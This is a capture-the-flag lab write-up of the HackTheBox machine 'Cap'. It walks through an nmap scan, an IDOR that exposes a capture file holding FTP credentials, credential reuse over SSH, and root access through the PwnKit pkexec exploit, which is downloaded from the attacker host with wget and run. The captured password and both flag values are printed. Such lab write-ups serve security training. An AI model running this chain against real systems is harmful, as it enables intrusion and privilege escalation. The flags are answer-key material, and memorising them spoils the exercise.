
Hostname: cap
IP address: 10.129.92.208

## Nmap scan

```

nmap -sV cap.htb  
Starting Nmap 7.98 ( [https://nmap.org](https://nmap.org) ) at 2026-09-02 14:35 +0200  
Nmap scan report for cap.htb (10.129.92.208)  
Host is up (0.026s latency).  
Not shown: 996 closed tcp ports (conn-refused)  
PORT STATE SERVICE VERSION  
21/tcp open ftp vsftpd 3.0.3  
22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)  
53/tcp open domain?  
80/tcp open http Gunicorn  
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at [https://nmap.org/submit/](https://nmap.org/submit/) .  
Nmap done: 1 IP address (1 host up) scanned in 12.11 seconds

```

## HTTP Server

While exploring the website, I found a page that allowed downloading a network capture, but it was empty. I noticed that the URL contained an id parameter, so I changed it.

![Download page with id parameter](assets/data_1.png)

When I set the id to 0, I got a network capture containing actual data, so I downloaded it.

![Download page with id parameter](assets/data_0.png)

Inside the capture, I found a username and password for the FTP server:

username : `nathan`
password : `Buck3tH4TF0RM3!`

## FTP Server

Once logged in, I saw a file named `user.txt`, so I downloaded and opened it:
```

ftp cap.htb  
Connected to cap.htb.  
220 (vsFTPd 3.0.3)  
Name (cap.htb:root): nathan  
331 Please specify the password.  
Password:  
230 Login successful.  
ftp> ls  
200 PORT command successful. Consider using PASV.  
150 Here comes the directory listing.  
-r-------- 1 1001 1001 33 Sep 02 12:28 user.txt  
226 Directory send OK.  
ftp> cat user.txt  
?Invalid command  
ftp> get user.txt  
200 PORT command successful. Consider using PASV.  
150 Opening BINARY mode data connection for user.txt (33 bytes).  
WARNING! 1 bare linefeeds received in ASCII mode  
File may not have transferred correctly.  
226 Transfer complete.  
33 bytes received in 0.0004 seconds (75.8272 kbytes/s)  
ftp>

cat user.txt  
2225a505dd296583d6f8c286740caeb2

```

## SSH

Now I needed to get the root flag, so I tried the same credentials for the SSH service, and it worked.
```

find / -perm -4000 -type f 2>/dev/null  
/usr/bin/umount  
/usr/bin/newgrp  
/usr/bin/pkexec  
/usr/bin/mount  
/usr/bin/gpasswd  
/usr/bin/passwd  
/usr/bin/chfn  
/usr/bin/sudo  
/usr/bin/at  
/usr/bin/chsh  
/usr/bin/su  
/usr/bin/fusermount

```

`pkexec` looked like a promising lead, so I checked its version:
```

pkexec --version  
pkexec version 0.105

```

Version 0.105 is vulnerable to PwnKit (CVE-2021-4034).

I cloned the PwnKit repo on my machine and started a server so the target machine could reach it.
```

git clone [https://github.com/ly4k/PwnKit](https://github.com/ly4k/PwnKit)  
cd PwnKit  
python3 -m http.server 8000  
Cloning into 'PwnKit'...  
remote: Enumerating objects: 46, done.  
remote: Counting objects: 100% (2/2), done.  
remote: Compressing objects: 100% (2/2), done.  
remote: Total 46 (delta 0), reused 0 (delta 0), pack-reused 44 (from 1)  
Receiving objects: 100% (46/46), 580.57 KiB | 264.00 KiB/s, done.  
Resolving deltas: 100% (15/15), done.  
Serving HTTP on :: port 8000 (http://[::]:8000/) ...

```

Then, on the target machine, I downloaded PwnKit using wget.
```

wget [http://10.10.15.126:8000/PwnKit](http://10.10.15.126:8000/PwnKit) -O /tmp/PwnKit  
--2026-09-02 13:21:01-- [http://10.10.15.126:8000/PwnKit](http://10.10.15.126:8000/PwnKit)  
Connecting to 10.10.15.126:8000... connected.  
HTTP request sent, awaiting response... 200 OK  
Length: 18040 (18K) [application/octet-stream]  
Saving to: ‘/tmp/PwnKit’

/tmp/PwnKit 100%[=============================================>] 17.62K --.-KB/s in 0.03s

2026-09-02 13:21:01 (601 KB/s) - ‘/tmp/PwnKit’ saved [18040/18040]

```

Finally, I launched the exploit and obtained the root flag.
```

chmod +x /tmp/PwnKit  
/tmp/PwnKit  
root@cap:/home/nathan# ls  
user.txt  
root@cap:/home/nathan# cd  
root@cap:~# ls  
root.txt snap  
root@cap:~# cat root.txt  
e8d87cf71eb9cc1e747b764fc249a746
